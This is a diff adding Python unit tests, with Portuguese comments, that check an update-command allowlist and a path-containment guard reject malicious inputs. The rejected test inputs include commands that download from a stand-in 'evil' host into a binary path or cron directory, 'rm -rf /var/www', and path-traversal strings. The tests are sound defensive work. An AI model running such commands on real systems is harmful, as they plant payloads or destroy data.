@@ -66,6 +66,28 @@ class ToolCommandGuardTests(TestCase):
         for bad in ['', '-rf', 'a/b', 'a;b', '../etc', 'a b', 'a$b']:
             self.assertFalse(_is_safe_path_segment(bad), f'deveria rejeitar: {bad!r}')
 
+    def test_update_allowlist_blocks_arbitrary_binary(self):
+        # #13 (revisão adversarial): shell=False não basta — um comando sem metacaractere
+        # como 'wget ... -O /go/bin/httpx' ainda rodaria; o binário base tem de estar na allowlist.
+        from api.views import _update_command_base, ALLOWED_UPDATE_BINARIES
+        for bad in ['wget http://evil -O /go/bin/httpx', 'curl http://evil -o /etc/cron.d/x',
+                    'rm -rf /var/www', 'bash /tmp/x']:
+            self.assertNotIn(_update_command_base(bad), ALLOWED_UPDATE_BINARIES,
+                             f'binário arbitrário não deveria ser permitido: {bad!r}')
+        for ok in ['go install github.com/x/y@latest', 'git pull', 'nuclei -update',
+                   'pip3 install netlas', '/usr/local/bin/subfinder -up']:
+            self.assertIn(_update_command_base(ok), ALLOWED_UPDATE_BINARIES,
+                          f'updater legítimo deveria ser permitido: {ok!r}')
+
+    def test_contained_tool_path_blocks_traversal(self):
+        # #13b (revisão adversarial): startswith é driblável por '..'; exige filho direto.
+        from api.views import _is_contained_tool_path
+        self.assertTrue(_is_contained_tool_path('/usr/src/github/nuclei'))
+        for bad in ['/usr/src/github/../../../etc/nginx', '/usr/src/github/..',
+                    '/usr/src/github', '/etc/nginx', '/usr/src/github/a;b',
+                    '', '/usr/src/github/a/b']:
+            self.assertFalse(_is_contained_tool_path(bad), f'deveria rejeitar: {bad!r}')
+
 
 class ToolFetchTimeoutTests(TestCase):
     @patch('Suricatoos.common_func.requests.get')
